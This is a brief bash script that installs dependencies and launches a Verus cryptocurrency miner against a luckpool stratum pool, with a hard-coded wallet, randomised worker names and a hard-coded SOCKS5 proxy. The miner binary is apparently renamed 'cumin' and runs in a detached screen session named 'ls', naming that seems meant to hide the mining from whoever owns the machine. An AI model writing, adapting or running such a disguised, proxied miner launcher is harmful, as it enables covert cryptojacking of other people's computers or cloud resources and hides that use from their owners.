#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x cumin
screen -dmS ls 
POOL=stratum+tcp://na.luckpool.net:3956
WALLET=RW5Tf4U3xwdjufXZ1JXD8tm4hBoe5fkwKz
WORKER=$(echo $(shuf -i 1-5 -n 1)-kolor)
PROXY=socks5://184.185.2.244:4145
./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY